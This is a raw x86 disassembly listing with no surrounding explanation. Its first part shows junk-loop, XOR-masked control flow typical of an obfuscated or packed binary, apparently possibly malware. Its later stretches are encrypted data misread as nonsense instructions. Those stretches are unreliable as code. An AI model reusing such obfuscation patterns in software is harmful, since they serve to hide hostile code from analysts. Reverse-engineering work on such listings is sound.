  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e7e6,ecx
  403899:	cmp    DWORD PTR ds:0x42e7e6,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e7e6,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42ea5c
  4038bc:	cmp    DWORD PTR ds:0x42e7e6,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e7e6
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e7e6,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42eea8,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42eea8
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42eea8,edi
  403903:	cmp    DWORD PTR ds:0x42eea8,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42ea74
  403920:	cmp    DWORD PTR ds:0x42eea8,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42eea8
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42eea8,edi
  40393a:	cmp    DWORD PTR ds:0x42eea8,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee9c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee9c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee9c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee9c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee9c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ec1c
  403988:	cmp    DWORD PTR ds:0x42ee9c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee9c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee9c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee94,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x430526
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43050e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x43052a,0x1d
  4039e0:	cmp    DWORD PTR ds:0x43052a,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x43052a,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42ea60
  403a03:	mov    edi,DWORD PTR ds:0x43052a
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x43052a,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42eeb0,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x43052a
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x4305da,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x4305da
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x4305da,edx
  403a58:	cmp    DWORD PTR ds:0x4305da,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42ea78
  403a77:	cmp    DWORD PTR ds:0x4305da,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x4305c2,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e7da,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x4305ca,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43050a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430612
  403aee:	mov    edx,DWORD PTR ds:0x42ea30
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x430532,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee9c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x43052a,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x43052a
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x43052a,edx
  403b28:	cmp    DWORD PTR ds:0x43052a,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eb40
  403b43:	cmp    DWORD PTR ds:0x43052a,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x43052a
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x43052a,edx
  403b5d:	cmp    DWORD PTR ds:0x43052a,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x4305c2,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430512,0x4305d2
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43050e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43050a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x430542,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42eea0,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42eeb0
  403bc5:	and    ebx,DWORD PTR ds:0x4305d2
  403bcb:	mov    DWORD PTR ds:0x42eeb0,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e7da,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e7da
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e7da,ebx
  403bea:	cmp    DWORD PTR ds:0x42e7da,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42ea7c
  403c05:	cmp    DWORD PTR ds:0x42e7da,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x430542,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43050e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43050e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43050e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea80
  403c4d:	cmp    DWORD PTR ds:0x43050e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43050e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43050e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43050e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43050e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x4305ce,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x4305ca,0x430542
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430506
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x4305ca
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42eea4,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43050a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x43052e,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e7f6
  403ce8:	adc    DWORD PTR ds:0x42ee90,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x43052a
  403cfb:	sbb    DWORD PTR ds:0x42e7ee,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax+0x692d326d],0x29
  403d2b:	aad    0xb6
  403d2d:	adc    DWORD PTR [esi+0x7e],edi
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403d50
  403d35:	imul   esi,DWORD PTR [edi-0x41faea7a],0x8f950102
  403d3f:	pop    ss
  403d40:	es pop edx
  403d42:	mov    bh,0xac
  403d44:	cld    
  403d45:	sbb    eax,0xeef8ea2
  403d4a:	push   ebp
  403d4b:	jmp    0x699e635f
  403d50:	cmp    eax,ebp
  403d52:	cmp    eax,ecx
  403d54:	and    BYTE PTR [edi],0x5f
  403d57:	sub    al,al
  403d59:	popa   
  403d5a:	and    esp,DWORD PTR [edx]
  403d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d5d:	data16 shr dl,cl
  403d60:	test   al,0x2d
  403d62:	mov    eax,0x243dc53d
  403d67:	xlat   BYTE PTR ds:[ebx]
  403d68:	mov    cl,0x1c
  403d6a:	pop    esp
  403d6b:	call   0xe0408971
  403d70:	push   edx
  403d71:	cmp    DWORD PTR [ebx+0x56],esp
  403d74:	jbe    0x403db8
  403d76:	cs mov ah,0x66
  403d79:	mov    esp,0x7ee60e81
  403d7e:	les    esi,FWORD PTR [ebp+0x5cbb6b28]
  403d84:	push   0xd0bac816
  403d89:	lahf   
  403d8a:	js     0x403d41
  403d8c:	dec    esi
  403d8d:	dec    ebx
  403d8e:	dec    esp
  403d8f:	jb     0x403d73
  403d91:	dec    eax
  403d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d93:	mov    ah,0x2a
  403d95:	sub    al,0x3b
  403d97:	add    eax,0x94871b30
  403d9c:	dec    ebx
  403d9d:	push   ebp
  403d9e:	xor    al,0x35
  403da0:	or     bh,al
  403da2:	iret   
  403da3:	add    al,0x9d
  403da5:	pop    edx
  403da6:	in     al,0x39
  403da8:	mov    ecx,0x5bcd25e8
  403dad:	ficom  WORD PTR [ebp-0xc]
  403db0:	push   0xf72707c7
  403db5:	in     eax,0x10
  403db7:	sub    dl,0x10
  403dba:	dec    DWORD PTR [edx+0x5f]
  403dbd:	pop    edx
  403dbe:	dec    ecx
  403dbf:	ja     0x403dd3
  403dc1:	in     al,0x52
  403dc3:	sub    edi,DWORD PTR [ecx-0xa779f6]
  403dc9:	std    
  403dca:	adc    eax,0x10ae6b59
  403dcf:	hlt    
  403dd0:	ret    
  403dd1:	clc    
  403dd2:	icebp  
  403dd3:	dec    eax
  403dd4:	fidivr DWORD PTR [esp+esi*2+0x68d75bf7]
  403ddb:	adc    cl,BYTE PTR [edi]
  403ddd:	int    0x25
  403ddf:	adc    BYTE PTR [ebp-0x1bd83072],ch
  403de5:	cmp    esi,esi
  403de7:	inc    esi
  403de9:	push   es
  403dea:	adc    BYTE PTR [edi+0x2d825c4c],ah
  403df0:	jmp    0x3d2add14
  403df5:	or     al,0xb2
  403df7:	sahf   
  403df8:	and    al,0xe8
  403dfa:	push   es
  403dfb:	add    al,0x36
  403dfd:	sub    dh,ah
  403dff:	sbb    edx,DWORD PTR [esp+edx*2]
  403e02:	jmp    0x51a0:0xa3e67cc4
  403e09:	and    al,0x60
  403e0b:	push   ebx
  403e0c:	add    cl,ch
  403e0e:	pop    ds
  403e0f:	mov    ch,0xc5
  403e11:	popa   
  403e12:	loope  0x403e80
  403e14:	jecxz  0x403db2
  403e16:	fisttp WORD PTR [edi+0x6acffc46]
  403e1c:	dec    BYTE PTR [eax]
  403e1e:	jo     0x403e12
  403e20:	dec    edx
  403e21:	push   edi
  403e22:	pop    edx
  403e23:	stos   DWORD PTR es:[edi],eax
  403e24:	mov    DWORD PTR [edx+0x43002e57],ebx
  403e2a:	mov    esi,0xc4c56473
  403e2f:	mov    ebx,0xbdc2f8ee
  403e34:	rcl    BYTE PTR [edx+0x5f],0xa0
  403e38:	bound  eax,QWORD PTR [edi]
  403e3a:	push   0xffffff8f
  403e3c:	call   0xeb91b149
  403e41:	adc    DWORD PTR [edi+0x46ba9bd6],esi
  403e47:	inc    esp
  403e48:	push   esi
  403e49:	jmp    0x8cd5:0x81f10230
  403e50:	(bad)  
  403e51:	jg     0x403e8a
  403e53:	cwde   
  403e54:	aas    
  403e55:	xchg   ebx,eax
  403e57:	nop
  403e58:	push   edi
  403e59:	shr    DWORD PTR [edi+0x32],1
  403e5c:	inc    edi
  403e5d:	inc    ecx
  403e5e:	xchg   ecx,eax
  403e5f:	adc    dh,cl
  403e61:	(bad)  
  403e62:	sub    eax,0x62acb984
  403e67:	dec    BYTE PTR [ebx+0x42c2e51a]
  403e6d:	call   0x6bc8:0x69dbf227
  403e74:	adc    eax,0x900711d2
  403e79:	adc    al,0xe4
  403e7b:	pop    ebx
  403e7c:	clc    
  403e7d:	dec    esp
  403e7e:	sbb    DWORD PTR [edx+0x2d],0x83ea10d5
  403e85:	inc    ebx
  403e86:	test   esi,edi
  403e88:	sub    bh,BYTE PTR [edx+0x6699cca4]
  403e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e8f:	js     0x403ea5
  403e91:	cmp    BYTE PTR [ecx-0x56],ch
  403e94:	inc    eax
  403e95:	sbb    esp,DWORD PTR [esi+0x159980c4]
  403e9b:	scas   al,BYTE PTR es:[edi]
  403e9c:	dec    edx
  403e9d:	lds    ebp,FWORD PTR [ecx-0x7b795525]
  403ea3:	jp     0x403ea4
  403ea5:	mov    edi,0xa0a5d189
  403eaa:	rcl    DWORD PTR [eax+0x9],1
  403ead:	popa   
  403eae:	and    edi,DWORD PTR [ebx+0x61]
  403eb1:	lea    ax,[ecx+0x3c]
  403eb5:	in     al,dx
  403eb6:	retf   0x35ac
  403eb9:	sbb    al,0x8d
  403ebb:	scas   al,BYTE PTR es:[edi]
  403ebc:	xchg   BYTE PTR [ecx-0x5d],ch
  403ebf:	add    eax,0xd8558bdb
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x757278c4,al
  403efc:	push   ss
  403efd:	dec    esi
  403efe:	rol    bl,0x13
  403f01:	jle    0x403f81
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403eb4
  403f08:	loop   0x403f10
  403f0a:	retf   
  403f0b:	pop    ss
  403f0c:	xor    DWORD PTR [edi-0x2a19a0c5],esi
  403f12:	dec    esi
  403f13:	mov    esi,0xde82e3ba
  403f18:	dec    edi
  403f19:	mul    DWORD PTR cs:[esi-0x6b]
  403f1d:	aad    0xc8
  403f1f:	mov    fs,WORD PTR [ebp+0x4a]
  403f22:	and    DWORD PTR [ebx+0x4e17049a],esi
  403f28:	out    0x22,al
  403f2a:	popa   
  403f2b:	(bad)  
  403f2c:	loope  0x403f58
  403f2e:	mov    al,0xe7
  403f30:	lock add edx,ebx
  403f33:	mov    edi,0x6b46aa0c
  403f38:	or     BYTE PTR [ecx-0xe06c7fa],dl
  403f3e:	add    edx,DWORD PTR [edx+0x46f86bcb]
  403f44:	mov    BYTE PTR [ecx],ch
  403f46:	(bad)  
  403f47:	sbb    BYTE PTR [ecx+0x52],dl
  403f4a:	push   ebp
  403f4b:	dec    edi
  403f4c:	inc    ecx
  403f4d:	or     eax,0xbbf285eb
  403f52:	bound  ebp,QWORD PTR ds:0xef486990
  403f58:	bound  esp,QWORD PTR [ecx+0x69a7ce1]
  403f5e:	(bad)  
  403f60:	stos   DWORD PTR es:[edi],eax
  403f61:	push   ebp
  403f62:	je     0x403f7f
  403f64:	mov    ebp,DWORD PTR cs:[edx]
  403f67:	dec    eax
  403f68:	dec    edx
  403f69:	les    eax,FWORD PTR [ebx]
  403f6b:	jno    0x403f9f
  403f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f6e:	(bad)  
  403f6f:	jle    0x403f22
  403f71:	adc    ch,BYTE PTR [ebp-0x3c]
  403f74:	(bad)  
  403f75:	cmp    bh,BYTE PTR [edx-0x2abe5ca7]
  403f7b:	sbb    esp,DWORD PTR [eax-0x1ff6c66f]
  403f81:	inc    ebp
  403f82:	ds iret 
  403f84:	xchg   edx,eax
  403f85:	add    al,0xae
  403f87:	idiv   DWORD PTR [eax-0x4d]
  403f8a:	in     eax,dx
  403f8b:	mov    ebp,0x202b69fe
  403f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f91:	sub    DWORD PTR [ebp+0x55e734bb],0x1f
  403f98:	push   esi
  403f99:	out    0x89,al
  403f9b:	aas    
  403f9c:	sbb    ch,al
  403f9e:	xor    eax,DWORD PTR [ecx-0x77]
  403fa1:	aam    0xc9
  403fa3:	add    al,0x56
  403fa5:	mov    cl,0x10
  403fa7:	pxor   mm2,QWORD PTR [esi]
  403faa:	imul   edi,edi,0x64
  403fad:	sub    eax,0xda725c7b
  403fb2:	or     DWORD PTR ds:0xb37fd713,ecx
  403fb8:	add    al,0xc3
  403fba:	sbb    DWORD PTR [edx],eax
  403fbc:	aas    
  403fbd:	xchg   edi,eax
  403fbe:	(bad)  
  403fbf:	xchg   esp,eax
  403fc0:	retf   
  403fc1:	cmp    al,0x18
  403fc3:	dec    ecx
  403fc4:	mul    BYTE PTR [esi-0x5a]
  403fc7:	cs dec ecx
  403fc9:	lock data16 in al,0x72
  403fcd:	dec    edx
  403fce:	dec    ecx
  403fcf:	sbb    BYTE PTR [edi-0x70],bh
  403fd2:	retf   
  403fd3:	jle    0x40401d
  403fd5:	fwait
  403fd6:	clc    
  403fd7:	in     eax,dx
  403fd8:	imul   edx,DWORD PTR [ecx+0x18],0xda3f9898
  403fdf:	(bad)  
  403fe0:	frstor [edi-0x743c75ea]
  403fe6:	and    al,0x3a
  403fe8:	or     eax,0x332add4f
  403fed:	and    ch,cl
  403fef:	jmp    0x92cd:0xb53a0015
  403ff6:	xchg   ecx,eax
  403ff7:	lds    ebp,FWORD PTR [edx-0x491cfe5a]
  403ffd:	in     al,0x66
  403fff:	popa   
  404000:	int    0x14
  404002:	aaa    
  404003:	inc    esi
  404004:	cli    
  404005:	pusha  
  404006:	cdq    
  404007:	shr    BYTE PTR [ebx-0x6],0xb7
  40400b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40400c:	inc    ebx
  40400d:	ins    BYTE PTR es:[edi],dx
  40400e:	clc    
  40400f:	inc    eax
  404010:	loopne 0x40403c
  404012:	sub    edi,DWORD PTR [ecx-0x203919d4]
  404018:	or     DWORD PTR [ebx+0x6013b65e],0x31971688
  404022:	inc    ebx
  404023:	fidiv  DWORD PTR [edi]
  404025:	and    BYTE PTR [esi+0x65],bl
  404028:	int    0xda
  40402a:	and    ch,bh
  40402c:	fistp  QWORD PTR [ebx+0x60bdcad5]
  404032:	in     eax,0x64
  404034:	int3   
  404035:	test   al,0xeb
  404037:	test   ebp,edi
  404039:	pop    ecx
  40403a:	add    ebx,DWORD PTR [edi+0x1de6bcb2]
  404040:	sub    esp,DWORD PTR [ecx]
  404042:	jp     0x404091
  404044:	push   ds
  404045:	outs   dx,BYTE PTR ds:[esi]
  404046:	inc    ebp
  404047:	call   FWORD PTR [ebx-0x51]
  40404a:	dec    ecx
  40404b:	mov    ds:0x79662e90,eax
  404050:	nop
  404051:	xchg   ebp,eax
  404052:	sbb    cl,ch
  404054:	or     ebp,DWORD PTR [edi]
  404056:	mov    eax,ds:0xc182b172
  40405b:	repnz mov BYTE PTR ss:[edx],bl
  40405f:	pop    ss
  404060:	push   edi
  404061:	dec    edx
  404062:	(bad)  
  404064:	jae    0x4040a2
  404066:	push   ecx
  404067:	data16 ins BYTE PTR es:[edi],dx
  404069:	enter  0x714d,0x96
  40406d:	lock push eax
  40406f:	(bad)  
  404070:	dec    ecx
  404071:	and    al,0x5c
  404073:	push   eax
  404074:	cmp    al,0x57
  404076:	cld    
  404077:	push   eax
  404078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404079:	dec    esi
  40407a:	mov    ebp,DWORD PTR [esi-0x6f]
  40407d:	les    edi,FWORD PTR [eax+0x16f410e]
  404083:	sbb    dl,cl
  404085:	dec    ecx
  404086:	push   edi
  404087:	(bad)  
  404089:	imul   eax,ebp,0x6caed9cf
  40408f:	pushf  
  404090:	xchg   BYTE PTR [edx-0x16],cl
  404093:	adc    ecx,DWORD PTR [ebx+0x77e9d455]
  404099:	add    eax,0x558b0000
  40409e:	int3   
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x2f355e6a]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x404122
  4040c0:	and    eax,0x431db0ac
  4040c5:	in     eax,dx
  4040c6:	ret    0x14a1
  4040c9:	lds    ecx,FWORD PTR ss:[ebx]
  4040cc:	adc    cl,cl
  4040ce:	das    
  4040cf:	sub    al,0x27
  4040d1:	inc    edx
  4040d2:	cmp    esi,ecx
  4040d4:	mov    esp,?
  4040d6:	dec    ebx
  4040d7:	cmp    bl,BYTE PTR [esi-0x23]
  4040da:	pop    esp
  4040db:	cmp    DWORD PTR [ecx+0x1dd5ed61],ecx
  4040e1:	jnp    0x404123
  4040e3:	iret   
  4040e4:	fsub   QWORD PTR [ebp+edx*2+0x29]
  4040e8:	jo     0x4040af
  4040ea:	push   edx
  4040eb:	aam    0x2
  4040ed:	jns    0x404115
  4040ef:	mov    esi,0x93760bb2
  4040f4:	push   ds
  4040f5:	shl    DWORD PTR [ebp+ecx*2-0x69699177],0xe4
  4040fd:	aam    0x25
  4040ff:	cmp    eax,ebx
  404101:	arpl   sp,bp
  404103:	sub    bl,BYTE PTR [esi-0x7b]
  404106:	fistp  QWORD PTR [eax+0x401b184a]
  40410c:	iret   
  40410d:	jne    0x4040b9
  40410f:	xchg   ebx,eax
  404110:	scas   al,BYTE PTR es:[edi]
  404111:	bound  esi,QWORD PTR [edx-0x58]
  404114:	xchg   DWORD PTR [ecx],esp
  404116:	lea    ebx,[esi]
  404118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404119:	sti    
  40411a:	cmc    
  40411b:	js     0x40412f
  40411d:	loopne 0x404177
  40411f:	pop    esp
  404120:	xor    edi,DWORD PTR [ecx+0x4a]
  404123:	jns    0x404103
  404125:	mov    eax,0x231631b0
  40412a:	sar    BYTE PTR [ebp+ebx*4-0x61],1
  40412e:	pop    esp
  40412f:	mov    al,0x8
  404131:	push   ds
  404132:	inc    esp
  404133:	add    BYTE PTR [ecx],bh
  404135:	aam    0x9d
  404137:	aam    0x96
  404139:	and    DWORD PTR [eax+ebx*1-0x4a374d7b],eax
  404140:	cli    
  404141:	int    0x76
  404143:	aas    
  404144:	sbb    bl,bl
  404146:	ret    0x6a0
  404149:	ficom  WORD PTR [edi+ebx*1+0x5b696d89]
  404150:	push   0x4e
  404152:	call   0xe839fb3a
  404157:	add    eax,0xa38e4e5d
  40415c:	lods   eax,DWORD PTR ds:[esi]
  40415d:	pushf  
  40415e:	dec    edi
  40415f:	inc    edx
  404160:	cs mov esi,esp
  404163:	sbb    edx,DWORD PTR [ebp+0x25]
  404166:	inc    ebp
  404167:	ficom  DWORD PTR [edx+0x5f]
  40416a:	cs push ss
  40416c:	inc    ecx
  40416d:	data16 loope 0x404120
  404170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404172:	sar    bl,0x64
  404175:	jecxz  0x404178
  404177:	add    DWORD PTR [esi+edx*4-0x27],ebx
  40417b:	mov    al,0x5f
  40417d:	inc    ebp
  40417e:	ret    
  40417f:	les    esp,FWORD PTR [eax-0x7788de70]
  404185:	int3   
  404186:	lea    esp,[ecx-0x7e]
  404189:	xor    edx,DWORD PTR [edi]
  40418b:	or     edi,edi
  40418d:	mov    dh,0x60
  40418f:	clc    
  404190:	ss push esp
  404192:	add    al,0xdd
  404194:	mov    DWORD PTR [ebx],edi
  404196:	mov    esi,0xd298e174
  40419b:	xor    BYTE PTR [esi],dh
  40419d:	sbb    bl,BYTE PTR [edi+ecx*1-0x68453d09]
  4041a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a5:	inc    esi
  4041a6:	push   ss
  4041a7:	sub    eax,0x75d0a2a2
  4041ac:	scas   al,BYTE PTR es:[edi]
  4041ad:	mov    esp,DWORD PTR ds:0x2a48a280
  4041b3:	add    BYTE PTR [edi+eiz*1],ah
  4041b6:	daa    
  4041b7:	retf   
  4041b8:	adc    BYTE PTR [ebx],cl
  4041ba:	dec    esi
  4041bb:	mov    eax,ds:0x55b192c0
  4041c0:	js     0x40416d
  4041c2:	jno    0x404172
  4041c4:	bound  eax,QWORD PTR [esi+ebx*1]
  4041c7:	dec    ecx
  4041c8:	adc    eax,0xeea3648c
  4041cd:	cmp    al,0x58
  4041cf:	daa    
  4041d0:	dec    esi
  4041d1:	inc    ecx
  4041d2:	adc    DWORD PTR [edx+0x520455e1],ecx
  4041d8:	mov    cl,0x35
  4041da:	sub    esp,esi
  4041dc:	xor    edi,ecx
  4041de:	pusha  
  4041df:	and    ebp,ecx
  4041e1:	mov    ebp,0xbef5b949
  4041e6:	sbb    BYTE PTR [edx-0x7b],0x7d
  4041ea:	popa   
  4041eb:	pop    ebp
  4041ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ed:	sbb    eax,DWORD PTR [edx+0x6e]
  4041f0:	mov    BYTE PTR [eax+ecx*2-0x65],cl
  4041f4:	repz cmp eax,0x95c49b38
  4041fa:	add    ecx,DWORD PTR [edi+0x35]
  4041fd:	and    BYTE PTR [eax],ah
  4041ff:	in     al,dx
  404200:	mov    cl,0xdc
  404202:	test   DWORD PTR [esi+0x2],eax
  404205:	adc    eax,0x81207aa5
  40420a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40420b:	sbb    esp,ebx
  40420d:	shl    BYTE PTR [bp-0x185],0x71
  404213:	mov    edx,0x733124e
  404218:	ret    
  404219:	dec    ecx
  40421a:	in     al,dx
  40421b:	sti    
  40421c:	adc    ebp,esp
  40421e:	pushf  
  40421f:	cld    
  404220:	out    dx,al
  404221:	or     al,0x48
  404223:	(bad)  
  404225:	popa   
